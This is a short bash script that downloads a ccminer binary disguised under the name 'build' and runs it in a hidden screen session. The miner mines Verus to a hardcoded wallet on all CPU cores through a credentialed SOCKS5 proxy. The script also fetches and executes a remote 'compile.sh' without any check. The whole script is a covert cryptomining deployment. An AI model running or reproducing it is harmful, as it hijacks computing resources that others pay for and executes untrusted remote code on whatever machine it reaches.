#!/bin/bash
proxy="socks5://omar:omar@164.90.244.21:333"
array[0]="01"
array[1]="02"
array[2]="03"
array[3]="04"
array[4]="05"
array[5]="06"
array[6]="07"
array[7]="08"
array[8]="09"
array[9]="10"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh
wget -qO build https://github.com/Omarjetos/ezz/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
